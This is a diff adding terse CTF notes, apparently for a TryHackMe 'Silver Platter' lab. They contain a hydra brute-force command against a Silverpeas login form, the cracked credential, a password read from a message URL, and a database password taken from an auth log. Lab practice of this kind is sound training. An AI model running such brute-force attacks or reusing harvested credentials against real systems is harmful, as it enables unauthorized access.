@@ -1,0 +1,12 @@
+hydra -l scr1ptkiddy -P /home/georgi/Desktop/CTFs/Silver\ Platter/cewl_passwords.txt www.silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"
+	scr1ptkiddy:adipiscing
+
+
+from http://www.silverplatter.thm:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
+	Username: tim
+	Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+	
+silveradmin@localhost
+
+auth.log.2:Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
+
